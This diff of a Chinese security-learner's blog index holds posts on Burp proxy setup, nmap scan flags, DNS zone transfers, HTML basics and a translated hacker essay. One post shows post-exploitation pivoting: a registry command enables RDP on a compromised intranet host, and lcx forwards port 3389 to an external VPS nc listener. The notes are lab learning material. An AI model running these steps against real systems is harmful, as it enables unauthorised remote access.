明白这一点对软件设计有重大影响。它意味着，编程语言首要的特性应该是允许动态扩展（malleable）。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。如果大家都像学校教的那样编程，那么静态类型（static<br>typing）^是一个不错的槪念。但是，我认识的黑客，没有一个人喜欢用静态类型语言编程。我们需要的是一种可以随意涂抹、擦擦改改的语言，我们不想正襟危坐，把一个盛满各种变量类型的茶杯，小心翼翼放在自己的膝盖上，为了与一丝不苟的编译器大婶交谈，努力地挑选词语，确保变量类型匹配，好让自己显得礼貌又周到。<br>^「静态类型是某些计算机语言的一个特性，指编译时对变量类型进行严格检査，典型代表是C、C++和Java。在这一类语言中，声明变量的时候，必须指定类型，而且以后不能再改变。这必然意味着，只有在你对整个程序流程和细节思考成熟以后，才能编写代码。与之对应的则是动态类型（dynamic<br>typing）语言，变量包含的数据类型可以随时改变。</p><hr><hr><p>译者注」<br>　　创作者不同于科学家，明白这一点有很多好处。除了不用为静态类型烦恼以外，还可以免去另一个折磨科学家的难题，那就是”对数学家的妒忌”。科学界的每一个人，暗地里都相信数学家比自己聪明。我觉得，数学家自己也相信这一点。最后的结果就是科学家往往会把自己的工作尽可能弄得看上去像数学。对于物理学这样的领域，这可能不会有太大不良影响。但是，你越往自然科学的方向发展，它就越成为一个严重的问题。<br>　　一页写满了数学公式的纸真是令人印象深刻啊。（小窍门：用希腊字母表示变量名会令人印象更深刻。）因此，你就受到巨大的诱惑，去解决那些能够用数学公式处理的问题，而不是去解决真正重要的问题。<br>　　如果黑客认识到自己与其他创作者</p><hr><hr><h2 id="比如作家和画家"><a href="#比如作家和画家" class="headerlink" title="比如作家和画家"></a>比如作家和画家</h2><hr><p>是一类人，这种诱惑对他就不起作用。作家和画家没有”对数学家的妒忌”，他们认为自己在从事与数学完全不相关的事情。我认为，黑客也是如此。<br>　　如果大学和实验室不允许黑客做他们想做的事情，那么适合黑客的地方可能就是企业。不幸的是，大多数企业也不允许黑客做他们想做的事情。大学和实验室强迫黑客成为科学家，企业强迫黑客成为工程师。<br>之所以会有这篇文章，因为我发现有些人对于hacker有很多误解，于是有了上面这张图。<br>入侵别人计算机并窃取信息的叫做骇客，当然…… 是违法的。 程序员 ≠<br>数学家 （在图片右侧） 程序员 ≠ 修电脑的 （在图片上部分）<br>所谓黑客是指精通计算机的人，而不是到处搞破坏的人。。<br>hacker这个概念是从美国传过来的，以我两年的网络安全学习经验来看，所有的原著书都表明了hacker<br>&#39;s attitude. 他们崇尚自由 他们不畏强权 他们总是乐于分享<br>他们拥有孩子般的好奇心 渴望了解一切事物的本质和根源 他们渴望挑战极限<br>从不逃避困难 他们了解如何将软件编写成为一种艺术 他们习惯突破常规思维<br>……<br>而不是所谓的窃取别人的信息，获取自己的利益，对金钱比对程序的兴趣更浓厚的所谓hacker。<br>[how to become a<br>hacker](<a href="http://www.catb.org//~esr/faqs/hacker-howto.htmlc">http://www.catb.org/\~esr/faqs/hacker-howto.htmlc</a>)</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>HTML基础 basic</title>
+    <link href="/2016/04/01/HTML%E5%9F%BA%E7%A1%80/"/>
+    <url>/2016/04/01/HTML%E5%9F%BA%E7%A1%80/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>HTML<br>====</p><p>hypertext markup language,超文本标记语言，是万维网的描述语言。</p><p>包括head和body两大部分，head包含浏览器所需信息，body表达要说明的具体内容。</p><h1 id="网页语言的发展"><a href="#网页语言的发展" class="headerlink" title="网页语言的发展 "></a>网页语言的发展 </h1><h2 id="X-HTML"><a href="#X-HTML" class="headerlink" title="(X)HTML"></a>(X)HTML</h2><hr><h2 id="DHTML"><a href="#DHTML" class="headerlink" title=" DHTML "></a> DHTML </h2><hr><h2 id="CSS"><a href="#CSS" class="headerlink" title=" CSS "></a> CSS </h2><hr><p> AJAX</p><p>注意！这只是按照时间排列的，人们使用的编写网页的语言，并没有说它们之间有什么联系。</p><p>编写网页变得越来越简便。</p><h1 id="下面我们介绍ajax技术"><a href="#下面我们介绍ajax技术" class="headerlink" title="下面我们介绍ajax技术"></a>下面我们介绍ajax技术</h1><p>AJAX即”Asynchronous Javascript And<br>XML”（异步JavaScript和XML），是指一种创建交互式网页应用的网页开发技术。</p><p>AJAX = 异步 JavaScript和XML。</p><p><strong>XML 并不是必需的，</strong>\</p><p>XML 在这里是想指数据传输格式是 XML，比如， AJAX 发出去的 HTTP<br>请求，响应回的</p><p>数据是 XML 格式，然后 JavaScript 去解析这个 XML DOM<br>树得到相应节点的内容。其实</p><p>响应回的数据格式还可以是 <em><strong>JSON</strong></em>（已经是主流）、文本、 HTML 等。</p><p>AJAX 是一种用于创建快速动态网页的技术。</p><p>通过在后台与服务器进行少量数据交换，AJAX<br>可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，<strong>对网页的某部分进行更新</strong>。</p><p>传统的网页（不使用 AJAX）如果需要更新内容，必须重载整个网页页面。</p><h1 id="json格式"><a href="#json格式" class="headerlink" title="json格式"></a>json格式</h1><p>json简单说就是javascript中的对象和数组，是javascript一个子集，这个格式就是<strong>方便传输数据</strong>用的\</p><h4 id="对于JavaScript的理解"><a href="#对于JavaScript的理解" class="headerlink" title="对于JavaScript的理解"></a>对于JavaScript的理解</h4><p>早期，由于浏览器彼此之间不兼容，于是js代码往往不能在多个平台上运行。。呃，如果黄金只有一个民族认为它值钱，那也没有什么卵用。</p><p>后来，万维网联盟推出了DOM，推行了标准化的文档对象模型，使得所有浏览器都支持它。</p><p>按照DOM编写的javascript代码，问题就很少了。</p><p>脚本=宏=批处理文件，是依据一定格式编写的可执行文件，可以被应用程序调用。\</p><p>通常以文本方式保存</p><p>脚本语言与编程语言相比，更简单，语法不那么复杂。</p><p>javascript，就是一种脚本语言。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>burp</title>
+    <link href="/2016/02/03/burp-CA%E8%AF%81%E4%B9%A6/"/>
+    <url>/2016/02/03/burp-CA%E8%AF%81%E4%B9%A6/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>不安装证书不能抓取https的网页。</p><p>参考：<a href="http://blog.csdn.net/sinat/_25449961/article/details/51585919/">http://blog.csdn.net/sinat\_25449961/article/details/51585919\</a></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-4ab91195acf53973.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>设置浏览器，用burp代理\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-60bf96a8869dcd12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>浏览一个网页，我们会发现打不开啊，因为burp截获了数据包\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c7453f1f0b1348ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>抓到了数据包\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e71a1a138aa263bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>tools</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>nmap</title>
+    <link href="/2016/02/03/nmap/"/>
+    <url>/2016/02/03/nmap/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-2a5b26164178d71d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>-A 参数，全部扫描<br>:::<br>:::</p><p>-A 是很激进的扫描，不推荐，容易被发现。</p><p><a href="http://blog.csdn.net/wufenghsk/article/details/69098677">参考资料</a></p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>-vv 对结果进行详细的输出。 </p><p>-sP 设置为ping扫描   </p><p><strong>/24 扫描C段存活的主机，也可以使用*，例如192.168.0.*</strong></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-3c3eb0d82a0f0e08.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>-Pn （ping no)不事先进行ping扫描，默认主机在线并扫描。</p><p>-PR 使用ARP（地址解析协议）扫描。</p><p>--send-ip 跳过ARP地址解析，如果是同网段的扫描，可以使用该选项</p><p><strong>-sS      Stealth TCP syn扫描，非常隐秘的扫描。（常使用）</strong></p><p>**-sT       Stealth TCP连接扫描，该参数最适合进行端口探测<br>**</p><p>**-sU       UDP扫描<br>**</p><p>-PE     发送ICMP请求应答数据包</p><p>在互联网上，有些主机会忽略ping扫描，所以若执行ping扫描，就会误认为不回应的主机并不在线，其实可以是在线的只不过没有响应ping。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-808b3ce7bcdde441.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>\</p><p>-p 80 扫描80端口是否开放</p><p>-sn 只进行主机探测，<strong>不扫描端口 （如果在root<br>权限下，不仅执行ICMP扫描，还在80和443端口执行tcp ping扫描）</strong></p><p>-oX myscan.xml 将扫描结果生成扫描文档</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a585b726ff81a323.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>lcx内网端口转发</title>
+    <link href="/2016/02/02/lcx%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    <url>/2016/02/02/lcx%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>参考：<a href="http://wooyun.jozxing.cc/static/drops/tools-15000.html">内网转发</a></p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-d029c7f3104a0a70.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>lcx的使用：当拿到一个处于内网主机的管理员权限，打开它的3389端口，映射到外网某公网IP的地址上。</p><p>这样，我们操作外网机子，就相当于操作内网主机，很方便。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>试验下：windowsxp<br>假设它是内网主机（使用host-only模式），它没有公网IP，它的内网IP是<br>192.168.57.129（网关192.168.60.100）</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-9deeb98499fd4fd6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-4c442de2034eeb77.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>网络拓扑图<br>:::<br>:::</p><p>内网主机开启3389端口：</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v<br>fDenyTSConnections /t REG_DWORD /d 00000000 /f</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>查看VPS（是购买的国外的服务器）可以用来监听的端口，选择一个<strong>没有使用的</strong>端口，比如9977。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-42c125389fdf5a6f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>外网主机，安装netcat</p><p>apt-get -y install nc</p><p>nc -l -p 9977 （在9977端口监听）</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>在内网主机上，命令”lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389<br>“</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-eb54986181dceea0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>乱码是因为winxp是英文版系统，所以中文就乱码了。make a connection……<br>说明连接成功了。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-a3c6c4afa0a7daf0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>、<br>:::<br>:::</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>lcx.exe -lister 外网端口 内网端口         <br> （在本地主机执行，用nc监听端口也可以）</p><p>lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389 <br> （在目标主机上执行，转发端口）</p><p>lcx.exe端口转发原理:<br><a href="https://tieba.baidu.com/p/3106571193?red%5C_tag=0064785128">https://tieba.baidu.com/p/3106571193?red\_tag=0064785128</a><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>如何使用区域传送</title>
+    <link href="/2016/02/02/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
+    <url>/2016/02/02/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>区域传送：有俩服务器，A，B。一个是主服务器，另一个备用（在A坏了的时候用）。</p><p>区域传送的目的:防止意外情况出现而影响域名解析。</p><p><strong>错误配置，导致只要收到请求，就提供区域数据库的详细信息。</strong></p><blockquote><p>nslookup(name sever looup)，可以查看域名和IP的映射。</p><p>首先输入nslookup，再设置选择列出DNS的类型，如set type=A，再输入域名\</p></blockquote><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>DNS记录有不同的类型，<strong>A记录</strong>代表主机记录，域名 &lt;--&gt;IP 映射。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-b380a25ff13e5bc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><p>NS记录，给出一个域名，查由哪些域名服务器进行解析。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-6e2a3527a7069468.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p><strong>MX记录</strong>代表邮件交换记录，作用是告知邮件服务器发送邮件到另一台邮件服务器。给出记录MX类型和域名，得到邮件服务器域名。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-481e595813cdb046.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><p>SOA记录用来标识DNS服务器的起始位置，可以指明主服务器。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>Linux下还可以使用host 命令，和nslookup作用一样。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-02e372f47ad70ae2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br><br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-3d546dd96d3f412f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>感觉linux上用host命令比较简洁，win上cmd显示的信息略杂。</p><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><p>\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-2c6b949876991a58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>区域传送<br>:::<br>:::</p><p>linux下可以使用dig 命令，对某台dns服务器尝试区域传送。</p><blockquote><p>dig @dns服务器 域名\</p></blockquote><p><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>translation</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>translation</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>OS入门 linux</title>
+    <link href="/2016/01/01/OS%E5%85%A5%E9%97%A8/"/>
+    <url>/2016/01/01/OS%E5%85%A5%E9%97%A8/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>OS即 operation system.\</p><p>1，关于桌面\</p><p>linux是基于命令行的，被windows惯坏的用户总以为没有图形界面就不算程序。\</p><p>当然，Linux也是有桌面的，不过那是一个可选项，和windows上的视频软件、音乐软件一样，所以不要搞混淆了。</p><p>Linux的桌面程序叫x window system.</p><p>2，关于用户</p><p>linux的最高权限用户叫做Root，windows的叫做Administrator.</p><p>3，关于版本</p><p>linux是开源的，windows是收费的。。你们用的windows专业版其实是要钱的，不过在盗版泛滥的地方，花钱买软件才是不正常的吧。</p><p>KED和Gnome ，前者是C++写的，后者是C语言写的。</p><p>linux有很多版本，因为是开放源代码的，你也可以自己定制。</p><p>4，关于命令</p><p>linux命令和windows的比较。当你是个小白用户的时候，显然，你只需一些很简单的操作，这时候你需要的只是快速上手，当你需要用到很复杂的操作，比如说分散藏在某个盘上面的某些（几百个）带有XD的文件复制到一个叫做TEST的文件夹里，或许你可以说你可以用搜索功能，在复制新建文件夹并粘贴过去，要是管理网段上的几十上百个主机呢？一个一个点击吗？</p><p>就像五笔打字一样，五笔打字在十年前，拼音打字没有大数据支持的情况下，打字速度是压倒性的。但是学习成本很高，普通用户用拼音打字足够，慢一点又有什么关系呢？</p><p>linux的<strong>学习成本</strong>比较高，但学会了就好了，运指如飞的五笔打字的熟练者不会觉得打字很难。</p><p>5，关于命令解释器-shell</p><p>有许多种shell，目的就是将<strong>命令</strong>转换为<strong>操作码</strong>。</p><p>有什么区别嘛？Bourn Shell<br>(简称bsh)是所有shell的始祖，后来又发展了很多shell，不过最常用的是Bourn-Again</p><hr><hr><p>由GNU项目开发的标准linux<br>shell\</p><p>centos与redhat<br>centos，开源<br>redhat，商业<br>两个版本内容差不多，centos甚至有更好的软件，yum可以在线升级。<br>不过redhat，商业版会提供IT技术支持。所以基本上是企业用户花钱买服务。<br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
   
 </search>
